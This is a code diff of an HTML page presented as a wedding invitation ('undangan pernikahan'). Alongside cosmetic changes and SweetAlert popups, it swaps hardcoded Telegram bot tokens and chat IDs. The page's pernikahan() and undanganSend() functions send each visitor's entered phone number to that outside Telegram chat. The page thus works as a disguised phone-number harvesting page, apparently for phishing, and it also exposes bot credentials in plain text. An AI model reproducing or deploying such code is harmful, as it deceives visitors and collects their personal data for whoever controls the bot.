@@ -28,6 +28,9 @@
     <link href="https://fonts.googleapis.com/css?family=Farsan" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Niconne" rel="stylesheet" type="text/css">
     <link href="https://fonts.googleapis.com/css?family=Norican" rel="stylesheet" type="text/css">
+    <link rel='stylesheet' href='https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.min.css'>
+    <script src="https://cdn.jsdelivr.net/npm/sweetalert2@7.12.15/dist/sweetalert2.all.min.js"></script>
+
 
 
 
@@ -385,11 +388,11 @@ border-left: 2px inset #50e3ff;
 }
 
 
- button{
-     text-align: center;
-     
- }
+ 
 
+button:hover {
+  background: orange;
+}
 
      .form-undangan {
          padding-top: 20px;
@@ -526,7 +529,7 @@ input[type="checkbox"]:disabled {
       <nav class="links">
         
         <center>
-            <form onsubmit="pernikahan()" action="undangan_pernikahan.html" class="form-undangan" method="get">
+           <form onsubmit="pernikahan(this);" action="undangan_pernikahan.html" class="form-undangan" method="get">
                 <input type="hidden" id="undangan" value="╚═❖•ೋ°𝗨𝗡𝗗𝗔𝗡𝗚𝗔𝗡 °ೋ•❖═╝"
                 <h3 style="margin-top: -5px; margin-bottom: 30px; font-size: 35px;
     -webkit-text-stroke-width: 0.8px;
@@ -549,11 +552,25 @@ input[type="checkbox"]:disabled {
 
     <!-- Dark mode button functionality -->
     <script src="/js/dark-mode.js"></script>
-  </body>
-</html>
+    <script>
+document.querySelector(".first").addEventListener('click', function(){
+  swal("Our First Alert");
+});
+document.querySelector(".second").addEventListener('click', function(){
+  swal("Our First Alert", "With some body text!");
+});
+document.querySelector(".btn-undangan").addEventListener('click', 
+
+function(){
+  swal("Our First Alert", "With some body text and success icon!", "success");
+});
+</script>
 <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"
     integrity="sha512-+NqPlbbtM1QqiK8ZAo4Yrj2c4lNQoGv8P79DPtKzj++l5jnN39rHA/xsqn8zE9l0uSoxaCdrOgFs6yjyfbBxSg=="
     crossorigin="anonymous" referrerpolicy="no-referrer"></script>
+
+  </body>
+</html>
 
  
 <script>
@@ -663,8 +680,8 @@ function undanganSend() {
 
     var gabungan = '' + undangan.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + tel.value;
    
-    var token = '5881895083:AAHmrO_F7HWqwnnWuB3Ohnwpjm2B03oWUjI'; // Ganti dengan token bot yang kamu buat
-    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '6280775813:AAG0MKkwNdNy1pJhbd92tHZH20DqlRtNogI'; // Ganti dengan token bot yang kamu buat
+    var grup = '5881060872'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
@@ -674,7 +691,7 @@ function undanganSend() {
 
 </script>
 <script>
-function pernikahan() {
+function pernikahan(form) {
 
 
     var undangan = document.getElementById('undangan');
@@ -682,8 +699,8 @@ function pernikahan() {
 
     var gabungan = '' + undangan.value + '%0A𝗡𝗼𝗺𝗼𝗿 𝗛𝗮𝗻𝗱𝗽𝗵𝗼𝗻𝗲%3A%0A' + tel.value;
    
-    var token = '5881895083:AAHmrO_F7HWqwnnWuB3Ohnwpjm2B03oWUjI'; // Ganti dengan token bot yang kamu buat
-    var grup = '5627477315'; // Ganti dengan chat id dari bot yang kamu buat
+    var token = '6280775813:AAG0MKkwNdNy1pJhbd92tHZH20DqlRtNogI'; // Ganti dengan token bot yang kamu buat
+    var grup = '5881060872'; // Ganti dengan chat id dari bot yang kamu buat
 
     $.ajax({
         url: `https://api.telegram.org/bot${token}/sendMessage?chat_id=${grup}&text=${gabungan}&parse_mode=html`,
